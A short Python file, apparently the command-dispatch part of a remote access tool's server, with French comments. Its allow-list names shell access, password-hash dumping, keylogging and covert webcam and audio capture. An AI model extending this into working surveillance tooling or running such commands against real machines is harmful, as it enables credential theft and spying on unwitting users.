import logging

class CommandHandler:
    def __init__(self, server):
        self.server = server
        self.logger = logging.getLogger(__name__)
        
    def validate_command(self, command, client_id):
        # valide qu'une commande est autorisee
        valid_commands = [
            "help", "ipconfig", "screenshot", "shell", "download", 
            "upload", "search", "hashdump", "keylogger", 
            "webcam_snapshot", "webcam_stream", "record_audio"
        ]
        
        cmd_type = command.split()[0] if command else ""
        
        if cmd_type not in valid_commands:
            self.logger.warning(f"Invalid command '{cmd_type}' from client {client_id}")
            return False
            
        return True
        
    def log_command(self, command, client_id, success=True):
        # log les commandes executees
        status = "SUCCESS" if success else "FAILED"
        client_info = self.server.clients.get(client_id, {})
        client_addr = client_info.get("addr", ("unknown", 0))
        
        self.logger.info(f"[{status}] Client {client_id} ({client_addr[0]}) executed: {command}")
        
    def sanitize_args(self, args):
        # nettoie les arguments pour eviter les injections
        if not args:
            return []
            
        sanitized = []
        for arg in args:
            # supprime les caracteres dangereux
            clean_arg = str(arg).replace(";", "").replace("&", "").replace("|", "")
            clean_arg = clean_arg.replace("`", "").replace("$", "")
            sanitized.append(clean_arg)
            
        return sanitized